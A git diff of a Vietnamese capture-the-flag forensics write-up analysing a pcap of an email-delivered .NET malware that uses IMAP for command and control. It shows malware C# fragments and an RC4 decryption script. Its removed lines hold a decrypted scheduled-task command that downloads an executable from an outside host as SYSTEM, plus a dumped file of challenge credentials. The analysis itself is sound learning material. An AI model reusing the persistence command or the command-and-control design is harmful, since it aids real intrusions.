@@ -8,11 +8,11 @@ Bài cho file pcapng, phân tích và trả lời 6 câu hỏi
 
 Follow HTTP stream 4, thấy được cuộc giao tiếp giữa client và server
 
-![image](https://github.com/user-attachments/assets/646b0dd0-57d2-4d34-8156-46a77c7e8f9c)
+![image](https://github.com/user-attachments/assets/45b3e307-e00b-4177-9d3e-a4facf88a3eb)
 
 Thực hiện GET request xem trước email (_action=preview) trong hộp thư đến (_mbox=INBOX) với UID 71 => opened
 
-Sau đó xuống dưới, thực hiện tiếp GET request với email trên, yêu cầu tải 1 hình ảnh => replied
+Sau đó xuống dưới, thực hiện tiếp GET request với email trên, yêu cầu tải 1 hình ảnh => `replied`
 
 ```
 Answer: Game Crash on Level 5
@@ -22,9 +22,9 @@ Answer: Game Crash on Level 5
 
 Lúc đang làm thì mình ngồi xem HTTP stream 1, thấy có một GET request lấy danh sách email trong hộp thư đến, server sẽ response danh sách dưới dạng json
 
-![image](https://github.com/user-attachments/assets/520b3411-3222-41b1-91e0-25e629433673)
+![image](https://github.com/user-attachments/assets/b7083dff-402a-4887-ac10-a37467192127)
 
-Mình thấy được 1 email với tiêu đề _Bug Report - In-game Imbalance Issue in Eldoria_, Eldoria có gì đó giống với tên giải nên mình lấy luôn time của cái email đó
+Mình thấy được 1 email với tiêu đề `Bug Report - In-game Imbalance Issue in Eldoria`, Eldoria có gì đó giống với tên giải nên mình lấy luôn time của cái email đó
 
 Nhập vô thấy correct :v
 ```
@@ -38,23 +38,21 @@ Answer: 2025-02-24_15:46
 
 Export object HTTP, thấy có 1 file zip, khả năng đây sẽ chứa malware
 
-![image](https://github.com/user-attachments/assets/81b78613-8a31-4d4b-a14e-d04854d6bddb)
+![image](https://github.com/user-attachments/assets/df9b69a4-d5b2-47a9-a40d-de25a6feb603)
 
 Save về không unzip được, thử crack cũng kh được, thì khả năng mật khẩu sẽ đc tìm thấy trong pcap
 
 Mình tìm đến stream 8, xem cuộc hội thoại giữa client và server về email liên quan đến malware kia
 
-![image](https://github.com/user-attachments/assets/011f5dbf-f2c0-48e1-89f2-3ea53c8d6cc0)
+![image](https://github.com/user-attachments/assets/07e5b8ee-813e-4815-adac-cbb306347451)
 
 Mình đoán sẽ có pass unzip ở trong này, thử tìm password thì ra
 
-![image](https://github.com/user-attachments/assets/b596a8bf-2f0a-4ef9-a61b-a850e7a674d9)
+![image](https://github.com/user-attachments/assets/3a9a1280-c323-4c34-9e0f-1c0d348c63e6)
 
-Unzip nhận được 1 file Eldoria_Balance_Issue_Report.pdf.exe
+Unzip nhận được 1 file `Eldoria_Balance_Issue_Report.pdf.exe`
 
-Giờ đi tìm md5 thôi, mình sử dụng Virustotal
-
-![image](https://github.com/user-attachments/assets/2df956ab-8963-4b4c-a4b4-717135f5f403)
+![image](https://github.com/user-attachments/assets/0f82fa6e-f65a-48de-a604-63b2cddf66f3)
 
 ```
 Answer: c0b37994963cc0aadd6e78a256c51547
@@ -62,23 +60,21 @@ Answer: c0b37994963cc0aadd6e78a256c51547
 
 >4. What credentials were used to log into the attacker's mailbox? (Format: username:password)
 
-Lúc mới vào làm, thì mình thấy có khá nhiều packet, nên có hỏi AI xem cần chú ý vào những protocol nào thì có được chỉ rằng là IMAP
+Lúc mới vào làm, thì mình thấy có khá nhiều packet, nên có hỏi AI xem cần chú ý vào những protocol nào thì có được chỉ rằng là `IMAP`
 
 Thử lọc IMAP thì có đc luôn username và password
 
-![image](https://github.com/user-attachments/assets/1d586b09-1b7e-4e2e-b9a4-38908ecbdeff)
+![image](https://github.com/user-attachments/assets/5e35d627-5f5e-4bef-a004-a860589ff5f4)
 
-Còn nếu làm bản chất thì phải rev con malware kia, dùng die để xác định thư viện
+Hoặc là có thể reverse con `malware` kia, `.Net` mình dùng dotpeek để decomplie
 
-![image](https://github.com/user-attachments/assets/9cdca5ac-0edb-46a6-812d-484aeb3814bc)
+![image](https://github.com/user-attachments/assets/9bd428c9-c419-4616-940d-0e630be34955)
 
-.Net thì dùng dotpeek hoặc ilspy để decomplie, mình dùng dotpeek
+Chương trình trên viết bằng `C#` để kết nối đến `IMAP server` sử dụng giao thức `TCP` và `SSL/TLS`
 
-![image](https://github.com/user-attachments/assets/27364a2e-ed4f-4758-8a0e-7791a2c2b5f1)
+Nhìn vào hàm creds, đây là hàm lưu thông tin đăng nhập để có thể xác thực với máy chủ email `mail.korptech.net`
 
-Chương trình trên sử dụng C# để kết nối đến IMAP server sử dụng giao thức TCP và SSL/TLS
-
-Nhìn vào hàm creds, đây là hàm lưu thông tin đăng nhập để có thể xác thực với máy chủ email mail.korptech.net
+![image](https://github.com/user-attachments/assets/bc52c9fe-a5ab-4534-84e0-c83a30040fe4)
 
 ```
 Answer: proplayer@email.com:completed
@@ -87,8 +83,7 @@ Answer: proplayer@email.com:completed
 
 Khi làm thì mình cần tìm câu trả lời càng sớm càng tốt, nên đã kiểu đoán mò khá nhiều, mình đã follow hết các stream liên quan đến IMAP nhưng kh thấy có task scheduled nào của attacker, nên mình nghĩ khả năng rất cao là nó nằm trong đống bị mã hóa này
 
-![image](https://github.com/user-attachments/assets/35f1b6a7-933d-4a3f-a2d0-9d576a5f5eba)
-
+![image](https://github.com/user-attachments/assets/7f906478-0d21-41c5-a15f-878c7c15d78c)
 
 Từ đây mình sẽ đi vào phân tích đoạn code C#, chú ý đến các hàm sau
 
@@ -133,18 +128,18 @@ private static void execute(string[] commands)
       }
     }
 ```
-Hàm execute thực hiện cố gắng kết nối đến máy chủ email bằng tài khoản chính (proplayer@email.com) , nếu không được thì dùng tài khoản dự phòng (proplayer1@email.com)
-- Nếu không phải lệnh change_ thì chạy lệnh, mã hóa kết quả, và gửi lên máy chủ dưới dạng email
+Hàm `execute` thực hiện cố gắng kết nối đến máy chủ email bằng tài khoản chính (proplayer@email.com) , nếu không được thì dùng tài khoản dự phòng (proplayer1@email.com)
+- Nếu không phải lệnh `change_` thì chạy lệnh, mã hóa kết quả, và gửi lên máy chủ dưới dạng email
 
 Tiếp theo là hàm mã hóa xor
 
-![image](https://github.com/user-attachments/assets/ac1e4ac2-67ba-4486-b534-ed3897cd25a2)
+![image](https://github.com/user-attachments/assets/fc55da73-6e80-4fec-9c54-ad7264dc5838)
 
 Hàm sử dụng một mảng byte cố định gồm 256 phần tử làm khóa (key)
 
-Đến đây là mình bị stuck, vì ban đầu mình nghĩ thì chỉ là xor giữa key và data xong base64 encrypt thông thường nhưng thử rất nhiều script giải mã mà kh cho ra kết quả mong muốn
+Đến đây là mình bị stuck, vì ban đầu mình nghĩ thì chỉ là xor giữa key và data xong base64 encoded thông thường nhưng thử rất nhiều script giải mã mà kh cho ra kết quả mong muốn
 
-Nhìn kĩ lại thì thấy ban đầu hàm return Exor.encrypt, giờ mình sẽ đi tìm hàm Exor xem nó làm gì
+Nhìn kĩ lại thì thấy ban đầu hàm return `Exor.encrypt`, giờ mình sẽ đi tìm hàm Exor xem nó làm gì
 
 ```C#
 namespace imap_chanel
@@ -188,9 +183,9 @@ namespace imap_chanel
   }
 }
 ```
-Đoạn mã trên thực hiện mã hóa RC4, Nó nhận vào một mảng byte pwd (khóa) và một mảng byte data (dữ liệu cần mã hóa), sau đó trả về dữ liệu đã được mã hóa dưới dạng mảng byte
+Đoạn mã trên thực hiện mã hóa RC4, Nó nhận vào một mảng byte pwd (khóa) và một mảng byte data (dữ liệu cần mã hóa)
 
-Đến đây đã xác định được kiểu mã hóa cho đoạn email được gửi đi:
+Đến đây đã xác định được kiểu mã hóa cho đoạn email được gửi đi ở trên:
 - RC4 tạo keystream
 - Xor keystream với data
 - Base64 encoded
@@ -245,22 +240,11 @@ data = base64.b64decode(b64_data)
 decrypted = rc4(key, data)
 print(decrypted.decode(errors="ignore"))
 ```
+Data lấy tại luồng tcp.stream 35
 
-Data sẽ được lấy từ imap trong wireshark
+![image](https://github.com/user-attachments/assets/b64acd2d-ecea-468a-94e6-f1254ac15606)
 
-Ở luồng tcp.stream 35 sẽ lấy được đáp án
-
-```
-(c) Microsoft Corporation. All rights reserved.
-
-
-
-C:\Users\dev-support\Desktop>schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM
-
-
-
-C:\Users\dev-support\Desktop>
-```
+![image](https://github.com/user-attachments/assets/43e14527-f763-47e8-9567-0ce002024d9d)
 
 ```
 Answer: Synchronization
@@ -269,39 +253,7 @@ Answer: Synchronization
 
 Vẫn tiếp tục là lấy data đem decode, thì ở stream 97 sẽ có được đáp án
 
-```
-Microsoft Windows [Version 10.0.19045.5487]
-
-(c) Microsoft Corporation. All rights reserved.
-
-C:\Users\dev-support\Desktop>more C:\backups\credentials.txt
-
-[Database Server]
-
-host=db.internal.korptech.net
-
-username=dbadmin
-
-password=rY?ZY_65P4V0
-
-[Game API]
-
-host=api.korptech.net
-
-api_key=sk-3498fwe09r8fw3f98fw9832fw
-
-[SSH Access]
-
-host=dev-build.korptech.net
-
-username=devops
-
-password=BuildServer@92|7Gy1lz'Xb
-
-port=2022
-
-C:\Users\dev-support\Desktop>
-```
+![image](https://github.com/user-attachments/assets/4081621b-df23-4606-b13e-91393ccb73d7)
 
 ```
 Answer: sk-3498fwe09r8fw3f98fw9832fw
